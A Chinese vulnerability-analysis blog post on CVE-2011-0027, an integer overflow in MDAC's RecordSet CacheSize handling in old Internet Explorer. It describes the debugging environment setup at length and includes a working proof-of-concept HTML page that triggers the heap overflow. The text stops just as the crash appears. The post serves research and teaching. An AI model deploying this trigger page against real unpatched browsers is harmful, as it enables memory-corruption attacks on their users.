
如果有的下载地址已经无法访问，一定要善用<a href="elink@91eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2M7X3y4Z5K9i4k6W2i4K6u0W2L8%4u0Y4i4K6u0r3">internet archive</a>，有些资源地址有历史快照。

# 0. 前言

这篇文章对CVE-2011-0027整数溢出漏洞进行了分析，之前在没有系统看过0day安全之前也曾经分析过[一个整数溢出漏洞](https://bbs.pediy.com/thread-261984.htm)，只不过导致溢出的运算不太一样，感兴趣的可以去看一下那篇文章。

在分析这个漏洞的过程中，花费精力最多的其实是环境的搭建，因为漏洞已经比较老了，遇到了各种坑。之前的漏洞分析最晚在周四也能完成，这次到周四才把环境搭建好。

本文首先对MDAC进行了简单的介绍，然后花费了一定篇幅说明了搭建环境过程中遇到的各种问题，之后大致按照《漏洞战争》中的流程对漏洞进行了调试分析。总体来说漏洞原理其实并不复杂，只是环境搭建花费了很多时间。

# 1. 先决知识

## 1.1 漏洞简介

在MDAC处理`RecordSet`时，没有正确验证其指定缓冲区大小的`CacheSize`属性，如果属性值过大，会导致整数溢出，造成实际分配的空间大小小于原来指定的内存空间。由于漏洞发生在堆上，最终会导致堆溢出。

## 1.2 MDAC是什么

MDAC全程是`Microsoft Data Access Components`，即微软数据库访问组件。它为应用程序访问数据库提供了一个标准的接口。

MDAC在应用程序层使用的编程语言接口叫做`ActiveX Data Objects(ADO)`，使用ADO可以建立`Connection`对象，表示一个对数据库的会话连接，`Connection`对象包含一个`Execute`方法，应用程序通过这个方法执行想要的操作。ADO还支持`Command`对象，可以使用`Command`对象建立一个参数化的命令并执行；`Recodset`对象代表的就是数据库中表格形式的数据，`Execute`或者`Command`执行后返回的数据就是`Recordset`格式的，`Recordset`对象支持各种用于控制数据的选项。通常来说，`Recordset`对象表示的是整行数据，或者一行数据中的其中几列，而访问单独的列要使用`Field`对象。虽然通过`RecordSet`每次只能访问一行的数据，但是这并不表示每次访问的时候都需要访问一次数据库，`RecordSet`可以缓存多行数据，而`CacheSize`就表示了它可以缓存的数据大小。

更详细的关于ADO的信息可以查看[参考资料3](https://bbs.kanxue.com/elink@b88K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2F1L8%4c8A6L8$3&6Q4x3X3g2K6L8#2)9J5c8V1y4h3c8g2)9J5k6o6t1H3x3e0q4Q4x3X3b7H3x3o6t1%4i4K6u0V1e0h3W2U0M7X3!0K6L8$3k6@1i4K6u0V1c8r3q4@1j5g2)9J5k6p5q4U0j5$3g2K6M7#2)9J5k6p5y4G2L8i4m8G2L8X3g2F1N6s2y4Q4x3X3c8S2k6X3f1%4k6h3f1K6z5h3j5I4x3h3f1@1y4r3y4U0j5h3k6T1z5e0p5@1k6o6p5%4y4U0g2X3x3h3t1#2y4H3`.`.)。

## 1.3 进一步的知识点

在HTML中可以使用<XML>标签插入需要的数据，并提供方法访问这些数据，这一过程实际上就是在使用MDAC对数据库进行访问，这里使用的对象就是上面介绍的ADO。

因此可以在访问XML中的数据时使用我们上面介绍的一些对象和方法的名称，也可以在这一过程中，触发`CacheSize`中存在的整数溢出漏洞。

# 2. 漏洞分析

## 2.0 关于环境配置（绝望的一周）

这个东西我搞了一周，终于在周四得到了正确的异常和symbol信息……中间遇到各种问题：操作系统版本的问题、Windbg版本的问题、IE的版本问题、symbol找不到……

- 操作系统：我先后换了四个版本的操作系统，Win7 的32位和64位，Win7 SP1的64位以及WinXP SP3。其中Win7 SP1中的IE版本偏高无法触发异常；Win7的系统在调试的时候!heap总是找不到wow64.pdb。然后我开始用WinXP进行调试……
- IE版本：IE的版本要小于8.0.7601。
- Windbg版本问题：如果是在Win XP上面调试，直接使用最新的Windbg是不行的，`!heap`显示堆信息也会出问题，具体可以查看[这篇文章](https://bbs.kanxue.com/elink@a95K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8X3u0D9L8$3N6K6i4K6u0W2j5$3!0E0i4K6u0r3L8%4u0Y4j5h3&6A6j5#2)9J5c8Y4m8Q4x3V1j5#2x3o6l9#2y4U0x3K6i4K6u0W2K9s2c8E0L8l9`.`.)。所以最后在网上找了很久，找到了一个6.6.07.5的版本，这个版本可以在WinXP上面使用

但是……

后来发现在Winxp下调试的时候输出的调试信息会和正确的地址有误差，我也不知道是Windbg版本的问题还是符号文件有问题；与此同时，我也发现Win7 64位上面的符号文件是可以正常下载的，wow64.pdb也在正确的位置上，就是不知道为什么会报错。正当我几近绝望的时候，在[stackoverflow](https://bbs.kanxue.com/elink@0c2K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6N6r3q4U0K9$3!0$3k6i4u0X3L8r3!0%4i4K6u0W2j5$3!0E0i4K6u0r3M7i4g2W2M7%4c8A6L8$3&6K6i4K6u0r3x3U0j5%4z5e0f1#2x3e0m8Q4x3V1k6%4L8%4M7$3y4q4)9J5k6s2c8W2j5U0x3J5i4K6u0V1L8X3!0@1i4K6u0V1k6X3!0#2L8X3b7`.)上面搜索到了这样一条回复：

> My Windbg is 6.3.9600. I think you attach to some process, not open a wow64 process dump. If I attach to a wow64 process using 32bit windbg, all the commands can works fine. But when I open a wow64 process dump, both 32bit and 64bit windbg can not work. – Leon Nov 17 '14 at 5:08

感谢Leon，我突然意识到了我的问题，我选择的Windbg的位数可能是错的。因为用的是64位的虚拟机，所以我自然而然的选择了64位的Windbg。最终我安装了32位的Windbg，成功得到了正确的调试信息。

**Windbg 位数选择**：

- 如果你的调试主机运行的是32位版本的windows，使用32位的调试工具（不管此时被调试的目标机是 x86-based 还是 x64-based）
- 如果你的调试主机使用x64-based的处理器，并且运行64位的windows，请参考如下规则：
  - 如果你在分析dump文件，你可以使用32位或者64位的调试工具集。（不管dump文件是用户态的还是内核态的，也不管这个dump文件是在 x86-based 还是 x64-based的平台上抓的。）
  - 如果你在进行实时内核调试，你可以使用32位或者64位的调试工具集（不管此时被调试的目标机是 x86-based 还是 x64-based）
  - 如果你在进行实时用户态调试，并且调试器也在同一台机器上，对于64位的代码和32位的 WOW64代码都需要使用64位的调试工具集。使用 [`.effmach`](https://bbs.kanxue.com/elink@ac3K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3#2K6k6r3&6Q4x3X3g2E0K9h3y4J5L8%4y4G2k6Y4c8Q4x3X3g2U0L8$3#2Q4x3V1k6W2L8W2)9J5k6s2g2K6i4K6u0r3L8r3W2T1M7X3q4J5P5g2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3V1k6Z5j5i4u0V1N6$3q4J5k6g2)9J5c8X3k6X3y4e0j5J5z5e0b7&6i4K6t1^5N6W2)9K6c8s2k6K6i4K6u0W2z5o6f1`.).aspx)命令设置调试器的模式。
  - 如果你在实时调试32位的用户态代码，但是这些代码运行在一个单独的目标机器上，使用32位的调试工具集。

## 2.1 调试代码

以下是调试代码，保存成`poc.html`：

```
<html xmlns:t = "urn:schemas-microsoft-com:time">
<script language='javascript'>
function Start() {
localxmlid1 = document.getElementById('xmlid1').recordset;
localxmlid1.CacheSize = 0x40000358;
for (var i = 0; i < 0x100000; i++) {
localxmlid1.AddNew(["AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"], ["c"]);
localxmlid1.MoveFirst();
}
}
</script>
<body onLoad="window.setTimeout(Start, 100);" id="bodyid">
<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<XML ID="xmlid1">
<Devices>
<Device>
<AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA />
</Device>
</Devices>
</XML>
</body>
</html>
```

## 2.2确定函数的对应关系

之前只在分析MS06-055这个漏洞的时候有过调试IE的经历，在已经确认漏洞所在文件名时，可以直接根据漏洞相关信息在`Function name`中进行搜索，确定相关函数地址，然后在该地址处下断点进行调试。

在《漏洞战争》中，还讲到了另外一种调试的方法，在谷歌中搜索：`【关键词】 site:e86K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2Y4k6h3!0X3k6X3y4Z5j5i4m8H3k6h3I4D9i4K6u0W2j5$3!0E0`

*我在测试的时候一开始只搜到两个结果，最关键的那个没有搜索到，后来换了一个代理地址，就成功了，(lll￢ω￢)*

这样搜索的目的是为了找到在IE中存在的和`recordset`有关的类方法，因为需要在对应的方法处设置断点进行调试。

根据搜索结果，得到了三个和`recordset`有关的类：

`CEventObj::get_recordset`
`CEventObj::putref_recordset`
`CGenericElement::get_recordset`
`CObjectElement::get_recordset`
`CObjectElement::putref_recordset`

其中`CEventObj`是为html中`event`对象提供的接口，可以忽略不记，代码中是一个获取`recordset`的行为，所以最终要在`CGenericElement::get_recordset`和`CObjectElement::get_recordset`上下断点。

poc.html打开之后，设置好断点，继续执行，程序断在了`CGenericElement::get_recordset`这个函数上，说明代码中`localxmlid1 = document.getElementById('xmlid1').recordset;`这个语句对应的是`CGenericElement::get_recordset`函数。

## 2.3 开始调试

先确定一下漏洞发生的位置，还是使用之前漏洞分析时介绍的方法，为`iexplor.exe`设置页堆：

```
C:\Documents and Settings\test>"C:\Documents and Settings\test\Desktop\Global Flags.lnk" -i iexplore.exe +hpa
Current Registry Settings for iexplore.exe executable are:
02000000
hpa - Enable page heap
```

打开poc.html，根据IE的默认安全设置，此时JS脚本是不会执行的，需要额外的步骤进行确认。这时使用windbg附加到iexplore.exe上，继续执行，再在IE上面"允许阻止的内容"，此时就会发生异常：
